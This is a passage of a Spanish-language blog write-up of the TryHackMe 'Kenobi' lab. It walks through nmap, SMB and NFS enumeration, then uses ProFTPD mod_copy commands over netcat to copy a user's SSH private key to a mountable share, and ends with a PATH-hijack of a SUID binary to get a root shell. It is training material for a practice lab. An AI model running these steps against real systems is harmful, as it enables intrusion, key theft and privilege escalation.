      <td style="text-align: left">La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos <code class="language-plaintext highlighter-rouge">White Hat</code></td>
    </tr>
    <tr>
      <td style="text-align: left">-v</td>
      <td style="text-align: left"><em>Verbose</em>, reporta lo encontrado por consola</td>
    </tr>
    <tr>
      <td style="text-align: left">-n</td>
      <td style="text-align: left">No aplicar <em>resolución DNS</em></td>
    </tr>
    <tr>
      <td style="text-align: left">-sS</td>
      <td style="text-align: left">Escaneo <em>TCP SYN</em></td>
    </tr>
    <tr>
      <td style="text-align: left">-min-rate</td>
      <td style="text-align: left">Emitir paquetes no más lentos que &lt;valor&gt; por segundo</td>
    </tr>
    <tr>
      <td style="text-align: left">-vvv</td>
      <td style="text-align: left">Triple <em>verbose</em>, para obtener mayor información por consola</td>
    </tr>
    <tr>
      <td style="text-align: left">-Pn</td>
      <td style="text-align: left">No aplicar <em>host discovery</em></td>
    </tr>
  </tbody>
</table>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 21,22,80,111,139,445,2049,35049,41843,47869,50933 &lt;dirección IP&gt;
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con <em>Nmap</em>:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Parámetro</th>
      <th style="text-align: left">Explicación</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">-sC</td>
      <td style="text-align: left">Scripts básicos de enumeración</td>
    </tr>
    <tr>
      <td style="text-align: left">-sV</td>
      <td style="text-align: left">Versión y servicios que corren bajo los puertos encontrados</td>
    </tr>
    <tr>
      <td style="text-align: left">-p</td>
      <td style="text-align: left">Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)</td>
    </tr>
  </tbody>
</table>

<p>Con estos dos escaneos bastaría para responder a dos de las preguntas planteadas:</p>

<ul>
  <li>¿Cuántos puertos abiertos existen?</li>
  <li>¿En qué puerto está corriendo el protocolo FTP?</li>
  <li>¿Cuál es la versión del servicio ProFTPD que se está corriendo?</li>
</ul>

<p>Para responder a estas dos últimas preguntas solo tenemos que revisar el escaneo de versiones y servicios que realizamos con <em>Nmap</em>; por otra parte, la primera pregunta tiene algo de trampa, ya que la respuesta correcta es <code class="language-plaintext highlighter-rouge">7</code> puertos abiertos, mientras que con nuestro escaneo detectamos <code class="language-plaintext highlighter-rouge">11</code>, ¿qué hicimos mal?</p>

<p>Nada, lo que sucede es que nosotros al indicar el parámetro <code class="language-plaintext highlighter-rouge">-p-</code>, estamos escaneando todo el rango de puertos, si no indicáramos este parámetro, <em>Nmap</em> escanearía únicamente los <code class="language-plaintext highlighter-rouge">1000</code> puertos más comunes, por lo que vemos que <em>TryHackMe</em> no se dio la molestia de escanearlo todo por completo.</p>

<p>Habiendo aclarado esto, los puertos abiertos más relevantes que encontramos son el <code class="language-plaintext highlighter-rouge">139</code> y el <code class="language-plaintext highlighter-rouge">445</code>, ambos relacionados con el protocolo <code class="language-plaintext highlighter-rouge">SMB</code> (Server Message Block), el puerto <code class="language-plaintext highlighter-rouge">111</code> relacionado con el servicio <code class="language-plaintext highlighter-rouge">rpcbind</code>, relacionado a su vez con <code class="language-plaintext highlighter-rouge">RPC</code> (Remote Procedure Call), y el puerto <code class="language-plaintext highlighter-rouge">21</code> relacionado con el protocolo <code class="language-plaintext highlighter-rouge">FTP</code> (File Transfer Protocol).</p>

<p>En este punto, <em>TryHackMe</em> nos sugiere usar el propio <em>Nmap</em> para enumerar los recursos compartidos a través de <code class="language-plaintext highlighter-rouge">Samba</code>, que si bien podemos hacerlo, optaremos por usar <code class="language-plaintext highlighter-rouge">SMBMap</code> y <code class="language-plaintext highlighter-rouge">smbclient</code>.</p>

<h3 id="smbmap"><a href="#header-3"></a>SMBMap</h3>

<p>Para poder listar los recursos compartidos haciendo uso de <code class="language-plaintext highlighter-rouge">SMBMap</code>, bastará con indicar la direción IP de la máquina víctima.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> &lt;dirección IP&gt;
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/2.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Lo primero que podemos darnos cuenta es que existen <code class="language-plaintext highlighter-rouge">3</code> recursos compartidos, de los cuales solo tenemos acceso a uno, <code class="language-plaintext highlighter-rouge">anonymous</code>.</p>

<p>Si decidimos listar de manera recursiva el recurso <code class="language-plaintext highlighter-rouge">anonymous</code>, encontraremos un archivo que lleva por nombre <code class="language-plaintext highlighter-rouge">log.txt</code>, el cual ya levanta nuestras sospechas.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> &lt;dirección IP&gt; <span class="nt">-R</span> anonymous
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/3.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Para poder descargar el archivo <code class="language-plaintext highlighter-rouge">log.txt</code>, podremos hacerlo usando tanto su ruta absoluta con el parámetro <code class="language-plaintext highlighter-rouge">--download</code>, o bien creando patrones mediante <em>expresiones regulares</em> con el parámetro <code class="language-plaintext highlighter-rouge">-A</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> &lt;dirección IP&gt; <span class="nt">--download</span> anonymous/log.txt
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> &lt;dirección IP&gt; <span class="nt">-R</span> anonymous <span class="nt">-A</span> log.txt
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/4.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<h3 id="smbclient"><a href="#header-3"></a>smbclient</h3>

<p>Para poder listar los recursos compartidos haciendo uso de <code class="language-plaintext highlighter-rouge">smbclient</code> tendremos que especificar el parámetro <code class="language-plaintext highlighter-rouge">-L</code>, adicional a ello tendremos que indicar que queremos hacer uso de un <code class="language-plaintext highlighter-rouge">null session</code> con el parámetro <code class="language-plaintext highlighter-rouge">-N</code>, ya que no conocemos credenciales con las cuales autenticarnos; esto con <code class="language-plaintext highlighter-rouge">SMBMap</code> no ocurría ya que por defecto hace uso de un <code class="language-plaintext highlighter-rouge">null session</code>, a no ser que le indiquemos un usuario y contraseña.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-N</span> <span class="nt">-L</span> &lt;dirección IP&gt;
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/5.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>En este caso, no se nos indica los permisos que tenemos sobre los recursos, no obstante, podemos intuir a que recursos tenemos acceso, por ejemplo, el recurso <a href="https://wiki.samba.org/index.php/Setting_up_Automatic_Printer_Driver_Downloads_for_Windows_Clients#Setting_up_the_.5Bprint.24.5D_Share">print$</a> se relaciona con impresoras que se están compartiendo a nivel de red, por otra parte, tenemos el recurso <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session">IPC$</a> el cual crea el propio <em>Windows</em> para poder hacer uso de los <em>null sessions</em>; de modo que, de los <code class="language-plaintext highlighter-rouge">3</code> recursos compartidos existentes, solo nos queda <code class="language-plaintext highlighter-rouge">anonymous</code>.</p>

<p>Lo siguiente que haremos será listar el contenido que se encuentra dentro del recurso <code class="language-plaintext highlighter-rouge">anonymous</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-N</span> //dirección IP/anonymous
<span class="nb">ls</span>
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/6.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Podemos observar que dentro existe un archivo llamado <code class="language-plaintext highlighter-rouge">log.txt</code>, el cual procederemos a descargar.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-N</span> //dirección IP/anonymous
get log.txt
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/7.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Independientemente de como hayamos descargado el archivo <code class="language-plaintext highlighter-rouge">log.txt</code>, al leerlo, lo más importante que encontraremos será la ubicación del par de claves <code class="language-plaintext highlighter-rouge">RSA</code>, ubicadas en <code class="language-plaintext highlighter-rouge">/home/kenobi/.ssh</code>.</p>

<p>Adicionalmente, encontraremos información tanto del servicio <code class="language-plaintext highlighter-rouge">ProFTPD</code>, como del <code class="language-plaintext highlighter-rouge">Samba</code>, pero nada realmente interesante, por lo que estamos omitiendo algo.</p>

<p>Si recordamos, el puerto <code class="language-plaintext highlighter-rouge">111</code>, relacionado con <code class="language-plaintext highlighter-rouge">rpcbind</code>, estaba abierto, y lo que nos mostraba nuestro escaneo de versiones y servicios con <em>Nmap</em>, es que en este puerto está corriendo a su vez el protocolo <code class="language-plaintext highlighter-rouge">NFS</code> (Network File System) en el puerto <code class="language-plaintext highlighter-rouge">2049</code>.</p>

<p>El protocolo <code class="language-plaintext highlighter-rouge">NFS</code> se utiliza principalmente para acceder a archivos compartidos a nivel de red, de manera local. Comprobemos si se está compartiendo algún recurso que podamos <em>montar</em> en nuestro equipo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>showmount <span class="nt">-e</span> &lt;dirección IP&gt;
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/8.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>La ruta <code class="language-plaintext highlighter-rouge">/var</code> está siendo compartida a nivel de red, de modo que si lográramos mover algún archivo potencial dentro de esta ruta, y luego la montásemos en nuestro equipo, podríamos visualizar dicho archivo de manera local.</p>

<h3 id="fase-de-explotación"><a href="#header-3"></a>Fase De Explotación</h3>

<p>Lo primero que podemos pensar es buscar alguna vulnerabilidad en el servicio <code class="language-plaintext highlighter-rouge">ProFTPD</code>, basado en <code class="language-plaintext highlighter-rouge">FTP</code> (File Transfer Protocol), moviendo así archivos desde el lado del cliente, hacia el servidor.</p>

<p>Para explotar el servicio <code class="language-plaintext highlighter-rouge">ProFTPD</code>, empezaremos buscando algún exploit que se encuentre en <em>Exploit Database</em>, para ello utilizaremos <em>SearchSploit</em> para poder seguir trabajando desde nuestra terminal.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit ProFTPD 1.3.5
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/9.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>De los <code class="language-plaintext highlighter-rouge">4</code> exploits que encontramos, nos quedaremos con el último</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/10.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Concretamente con las líneas 12, 13 y 14.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/11.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Las cuales nos permiten hacer justamente lo que nos interesa, copiar un archivo de una ruta (<em>CPFR</em>), a otra (<em>CPTO</em>).</p>

<p>De este modo, si nos conectamos a la máquina víctima a través del puerto <code class="language-plaintext highlighter-rouge">21</code>, podremos ejecutar estos comandos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc &lt;direción IP&gt; 21
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/12.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Ya con todo esto, podemos <em>montar</em> la ruta <code class="language-plaintext highlighter-rouge">/var</code> en nuestro equipo, para ello haremos lo siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>mount &lt;dirección IP&gt;:/var /mnt/kenobiNFS
</code></pre></div></div>

<p>En caso de que tengamos un error similar a este:</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/13.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Simplemente tendremos que instalar lo siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>nfs-common
</code></pre></div></div>

<p>Y ya que estamos, podemos también instalar la utilidad para montar archivo de tipo <code class="language-plaintext highlighter-rouge">CIFS</code>, que puede resultarnos de utilidad en algún momento.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>cifs-utils
</code></pre></div></div>

<p>Una vez tenemos montada la ruta <code class="language-plaintext highlighter-rouge">/var</code> en nuestro equipo, procederemos a copiarnos el archivo <code class="language-plaintext highlighter-rouge">id_rsa</code> que movimos con anterioridad haciendo uso de <code class="language-plaintext highlighter-rouge">ProFTPD</code>.</p>

<p>Finalmente, podemos conectarnos a la máquina víctima a través de <code class="language-plaintext highlighter-rouge">SSH</code> sin proporcionar contraseña, ya que tenemos en nuestro poder la <em>clave privada</em> del usuario <code class="language-plaintext highlighter-rouge">Kenobi</code>, no obstante, antes de hacerlo, vamos a asignar los permisos correspondientes al archivo <code class="language-plaintext highlighter-rouge">id_rsa</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo chmod </span>600 id_rsa
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> id_rsa kenobi@&lt;dirección IP&gt;
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/14.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>

<p>Para realizar esta última fase, la misma plataforma de <em>TryHackMe</em> nos sugiere aprovecharnos de algún binario con permisos mal asignados, concretamente permisos <code class="language-plaintext highlighter-rouge">SUID</code>.</p>

<p>Para listar todos aquellos binarios con permisos <code class="language-plaintext highlighter-rouge">SUID</code> asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-la</span> <span class="o">{}</span> 2&gt;/dev/null <span class="se">\;</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-uid</span> 0 <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/15.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>La forma más sencilla para abusar de algún binario con permisos mal asignados sería recurrir a <a href="https://gtfobins.github.io/">GTFOBins</a>, sin embargo, el binario que llama nuestra atención no es propio del sistema, por lo que <code class="language-plaintext highlighter-rouge">GTFOBins</code>, no nos será de utilidad.</p>

<p>Si comprobamos en nuestra máquina de atacantes, no existe ningún binario <code class="language-plaintext highlighter-rouge">/usr/bin/menu</code>, por lo que este debe haber sido creado, de modo que puede tener alguna falla de seguridad, vamos a revisarlo.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/16.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Vemos que el binario es lo que dice ser, un menú que nos presenta tres únicas posibilidades, vamos a echar un vistazo más a fondo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings /usr/bin/menu
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/17.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Podemos observar los binarios que utiliza este menú dependiendo de la opción que seleccionemos, lo más interesante aquí es que no se está empleando la ruta completa de estos comandos, tan solo se los está mencionando, por lo que, al no hacer esta verificación, podemos suplantarlos.</p>

<p>Antes de que el binario <code class="language-plaintext highlighter-rouge">/usr/bin/menu</code> encuentre los binarios legítimos dentro de la variable de entorno <code class="language-plaintext highlighter-rouge">PATH</code>, nosotros añadiremos nuestros propios binarios en el inicio, los cuales serán igual en nombre, pero ejecutarán el código que nos interese, en este caso una consola con máximos privilegios.</p>

<p>Este proceso podemos realizarlo para cualquiera de los tres binarios, <em>curl</em>, <em>uname</em> o <em>ifconfig</em>, eso si, debemos de encontrarnos en una ruta donde tengamos permisos de escritura, el directorio del usuario <code class="language-plaintext highlighter-rouge">Kenobi</code>, o la ruta <code class="language-plaintext highlighter-rouge">/tmp</code> por ejemplo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'/bin/sh'</span> <span class="o">&gt;</span> <span class="nb">uname
export </span><span class="nv">PATH</span><span class="o">=</span>/home/kenobi:<span class="nv">$PATH</span>
<span class="nb">chmod</span> +x <span class="nb">uname</span>
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/18.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

</article>

<div class="image-overlay" onclick="closeImage()"></div>
<img id="expandedImage" class="expanded-image">

<script>
function expandImage(img) {
  var expandedImg = document.getElementById("expandedImage");
  var overlay = document.querySelector(".image-overlay");

  expandedImg.src = img.src;

  overlay.style.display = "block";
  expandedImg.style.display = "block";

  document.addEventListener("keydown", handleEscKey);
}

function closeImage() {
  var expandedImg = document.getElementById("expandedImage");
  var overlay = document.querySelector(".image-overlay");

  overlay.style.display = "none";
  expandedImg.style.display = "none";

  document.removeEventListener("keydown", handleEscKey);
}

function handleEscKey(event) {
  if (event.key === "Escape" || event.key === "Esc") {
    closeImage();
  }
}
</script>

      </section>
    </div>
  </div>

  

  <footer>
  <a href="https://creativecommons.org/licenses/by-nc/4.0/">
    <span>
        <b>MateoNitro550</b>
    </span>
    
    <span>© 2024</span>
  </a>
</footer>


  
    <script type="text/javascript">
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'G-524F5BE8G5', 'auto');
  ga('send', 'pageview');
</script>
  

</body>
</html>
